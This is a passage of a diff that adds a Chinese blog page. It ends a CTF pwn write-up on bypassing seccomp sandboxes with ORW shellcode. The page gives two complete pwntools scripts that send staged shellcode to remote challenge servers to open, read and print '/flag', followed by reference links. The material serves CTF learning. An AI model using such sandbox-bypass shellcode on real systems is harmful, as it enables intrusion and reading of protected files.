+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">rom pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment">#io=process("./vuln")</span>
+io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"week-1.hgame.lwsec.cn"</span><span class="token punctuation">,</span><span class="token number">31266</span><span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
+
+shellcode2<span class="token operator">=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    push 0x67616c66
+    mov rdi,rsp
+    xor esi,esi
+    push 2
+    pop rax
+    syscall
+    mov rdi,rax
+    mov rsi,rsp
+    mov edx,0x100
+    xor eax,eax
+    syscall
+    mov edi,1
+    mov rsi,rsp
+    push 1
+    pop rax
+    syscall
+'''</span><span class="token punctuation">)</span>
+
+shellcode1<span class="token operator">=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
+    mov rdi,rax
+    mov rsi,rdx
+    mov edx,0x100
+    syscall
+    call rsi
+    nop
+'''</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode1<span class="token punctuation">)</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode1<span class="token punctuation">)</span>
+<span class="token comment">#gdb.attach(io)</span>
+<span class="token comment">#pause()</span>
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode2<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>或者：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment">#p = process('./vuln')</span>
+p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'1.14.71.254'</span><span class="token punctuation">,</span><span class="token number">28371</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./vuln'</span><span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+
+context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"konsole"</span><span class="token punctuation">,</span> <span class="token string">"-e"</span><span class="token punctuation">]</span>
+context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
+r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+ra <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
+rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
+sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
+ia <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+c <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+li <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+db <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+
+shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""
+    xor eax,eax
+    xor edi,edi
+    mov edx,0x1000
+    mov esi,0xcafe0000
+    syscall
+"""</span><span class="token punctuation">)</span>    <span class="token comment">#这里是调用read函数</span>
+sa<span class="token punctuation">(</span><span class="token string">"Please input your shellcode:"</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>
+shellcode <span class="token operator">=</span> <span class="token string">b"\x90"</span> <span class="token operator">*</span> <span class="token number">0x100</span>  <span class="token comment">#这里的'\x90'是nop,数据改掉后滑到shellcode的地方开始执行</span>
+shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xcafe0100</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xcafe0100</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+s<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
+ia<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236832#h3-8">PWN堆溢出技巧：ORW的解题手法与万金油Gadgets-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xie-yuanhao.gitee.io/2023/07/11/Pwn-%E6%B5%85%E8%B0%88ORW%E5%88%A9%E7%94%A8/">Pwn-浅谈orw利用 | 此间的少年 (gitee.io)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fuxuqiannian/p/17144953.html#">orw入门报告 - ㅤ浮虚千年 - 博客园 (cnblogs.com)</a></p>
+
+          <div class="post-tags">
+            <!-- 文章tags -->
+            
+          </div>
+          <p class="motto">重拾纯粹的写作</p>
+        </article>
+        <!-- 评论 -->
+        <div id="vcomments"></div>
+      </div>
+    </main>
+    <!-- toc -->
+    
+    <cosy-drag-box id="toc-drag-box" trigger="left" min-width="220" uid="toc-box">
+      <div class="meta-container">
+        <div class="toc-wrapper cosy-scrollbar">
+          <p class="catalog">
+            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24">
+              <g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M4 6h16"></path>
+                <path d="M4 12h16"></path>
+                <path d="M4 18h12"></path>
+              </g>
+            </svg>
+            <span>目录</span>
+          </p>
+          <!-- 文章toc -->
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B2%99%E7%9B%92"><span class="toc-number">1.</span> <span class="toc-text">沙盒</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AForw%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么是orw？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFseccomp"><span class="toc-number">1.2.</span> <span class="toc-text">什么是seccomp?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0%E6%B2%99%E7%9B%92%EF%BC%9F"><span class="toc-number">1.3.</span> <span class="toc-text">怎么实现沙盒？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#prctl%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">prctl函数调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#seccomp"><span class="toc-number">1.3.2.</span> <span class="toc-text">seccomp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E6%B2%99%E7%AE%B1%E8%A7%84%E5%88%99%E7%9A%84shellcode"><span class="toc-number">1.4.</span> <span class="toc-text">编写沙箱规则的shellcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">沙盒的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AE%80%E5%8D%95%E6%A0%88%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">1.简单栈利用：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-orw-shellcode"><span class="toc-number">2.2.</span> <span class="toc-text">2.orw+shellcode:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E6%80%9D%E8%B7%AF"><span class="toc-number">2.3.</span> <span class="toc-text">3、思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%8E%E7%89%88%E6%9C%AC"><span class="toc-number">2.3.1.</span> <span class="toc-text">低版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC"><span class="toc-number">2.3.2.</span> <span class="toc-text">高版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-shellcode"><span class="toc-number">2.4.</span> <span class="toc-text">simple_shellcode</span></a></li></ol></li></ol>
+        </div>
+      </div>
+    </cosy-drag-box>
+    
+  </div>
+
+</div>
+
+<script>
+  window.page = {
+    use: ''
+  }
+  window.katex = {
+    enable: "",
+    jsCdn: "//cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.js",
+    cssCdn: "//cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.css"
+  }
+  window.mermaid = {
+    enable: "",
+    theme: "",
+    cdn: "//cdn.jsdelivr.net/npm/mermaid@10.4.0/dist/mermaid.min.js",
+  }
+  window.valine = {
+    enable: "",
+    appId: '4Q4EAMdq8elmFDwiIj0R0Z80-gzGzoHsz',
+    appKey: 'JRv5ulQZAwmbGgfeetCXRvoW',
+    avatar: 'monsterid',
+    cdn: '//unpkg.com/valine@latest/dist/Valine.min.js',
+    serverURLs: ''
+  };
+</script>
+
+
+<script src="/js/0af3d6bb.js"></script>
+
+  </main>
+</body>
+
+<script>
+  window.theme = {
+    color: 'hsl(238,50%,56%)'
+  }
+</script>
+
+
+<script src="/js/69a216b6.js"></script>
+
+
+</html>
